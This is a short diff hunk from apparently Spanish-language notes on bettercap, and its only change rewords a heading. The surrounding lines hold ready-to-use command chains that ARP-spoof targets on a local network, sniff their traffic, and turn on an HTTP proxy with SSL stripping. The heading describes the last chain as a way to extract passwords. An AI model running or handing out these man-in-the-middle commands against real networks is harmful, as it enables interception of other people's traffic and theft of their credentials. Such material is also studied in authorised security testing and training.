@@ -38,7 +38,7 @@ Ver Trafico:
 
 net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on
 
-Ver trafico por proxy y extrae claves:
+Ver trafico web por proxy y extrae claves:
 
 net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true
 
